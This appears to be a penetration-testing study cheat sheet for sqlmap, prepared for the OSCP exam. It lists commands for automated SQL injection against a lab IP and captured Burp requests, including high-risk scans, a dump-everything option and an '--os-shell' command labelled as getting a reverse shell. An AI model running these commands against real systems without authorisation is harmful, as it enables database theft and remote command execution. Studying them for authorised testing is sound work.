# SQLMAP

DISCLAIMER: There are a number of tools you are not allowed to use in your OSCP exam. At the time of writing, sqlmap is one of them. Check which tools are restricted/banned before you use them during your exam. You can find detailed information about tool usage in the exam guidelines.
Get Request

## Test All (Default Settings)

```
sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch
```

## Test All (Default Settings, High Stress)

```
sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch --level=5 --risk=3
```

## Post Request (Capture with BURP)
### Test All (Default Settings)

```
sqlmap --all -r post_request.txt --batch 
```

### Test All (Default Settings, High Stress)

```
sqlmap --all -r post_request.txt --batch --level=5 --risk=3
```

### Get A Reverse Shell (MySQL)

```
sqlmap -r post_request.txt --dbms "mysql" --os-shell
```

